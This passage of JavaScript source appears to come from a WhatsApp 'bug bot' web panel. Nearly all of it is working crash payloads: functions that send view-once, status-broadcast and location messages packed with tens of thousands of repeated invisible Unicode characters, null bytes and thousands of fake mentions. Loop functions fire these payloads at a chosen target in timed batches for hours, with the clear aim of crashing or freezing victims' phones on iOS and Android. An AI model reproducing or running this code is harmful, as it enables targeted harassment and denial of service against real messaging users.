      delete: {
        fromMe: true,
        remoteJid: X,
        id: kedua,
      }
    });
  } catch (err) {
    console.error(err);
  }
}


// -------------------( IOS FUNC )------------------------------ \\

async function iosinVisFC(jid, mention = false) {
console.log(chalk.red(`Succes Sending to ${jid}`))
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, //Trigger 5
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await Ataa.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Ataa.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
}

async function IosXCrash(target) {
try {
for (let s = 0; s < 5; s++){
    await Ataa.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "‼️⃟🎱 드림 가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐. ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "\u0000".repeat(25000) + "𑇂𑆵𑆴𑆿".repeat(90000),
          url: `https://t.me/sniith${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "‼️⃟🎱 드림 가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐. ҉҈⃝⃞⃟⃠⃤꙰꙲꙱" + "𑇂𑆵𑆴𑆿".repeat(60000),
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              },
            },
          },
        },
      },
      {
        participant: { jid: target }
      }
    )
  };
  } catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent IosXCrash to ${target}`))
 }    
 
 
const IosCrash = async (X) => {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "CRSD" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "CRSD" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/arcxerx - _ #",
        matchedText: "https://t.me/arcxerx",
        description: "鈥硷笍XERX鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        title: "鈥硷笍XERX鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "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",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    await Ataa.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
    await Ataa.relayMessage('status@broadcast', msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};


async function callinvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "#@rizxvelzdev",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  }, {});

  await Ataa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}


async function trashprotocol(target, mention) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@rizxvelzinfinity",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({ 
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗̸̷̷̷̋͜͢͜͢͠͡͡𝐕𝐄𝐋𝐙-‣"
                        }
                    },
                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});
    
    await Ataa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ataa.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "false" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


async function framersbug1(X) {
  const messageId = crypto.randomUUID();

  const Message = proto.Message.fromObject({
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: messageId
    },
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "᬴".repeat(20000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: "\u0000".repeat(30000)
          },
          contextInfo: {
            participant: X,
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "᬴".repeat(1000),
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              X,
              ...Array.from({ length: 1950 }, () =>
                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  });

  await Ataa.relayMessage("status@broadcast", Message, {
    messageId: messageId,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: X }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}


// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 10) {
      callinvisible(X),
      trashprotocol(X, false),
      NewBoeg(X),
      framersbug1(X);
      await new Promise(r => setTimeout(r, 1500));
      
      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 Andro 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 900);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( Grade COURSED 99 ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 700);
  }
};
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 10) {
      delayNew(X),
      trashprotocol(X, false),
      NewBoeg(X)
      await new Promise(r => setTimeout(r, 1000));

      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 Andro 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 900);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( Grade COURSED 99 ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 700);
  }
};
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 10) {
      iosinVisFC(X),
      IosXCrash(X)
      await new Promise(r => setTimeout(r, 1000));

      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 iOS 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 900);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( Grade COURSED 99 ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 700);
  }
};
  sendNext();
}


const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coursed Bug Api</title>
  <link rel="icon" href="https://files.catbox.moe/aorxh2.png" type="image/png">
